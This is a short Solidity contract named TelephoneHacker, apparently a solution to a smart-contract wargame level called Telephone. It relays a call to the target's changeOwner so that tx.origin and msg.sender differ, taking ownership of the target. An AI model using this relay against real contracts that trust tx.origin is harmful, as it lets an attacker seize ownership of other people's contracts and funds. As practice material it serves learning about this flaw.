// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneHacker {
    Telephone target;

    constructor(address targetAddr) {
        target = Telephone(targetAddr);
    }

    function relay(address newOwner) public {
        target.changeOwner(newOwner);
    }
}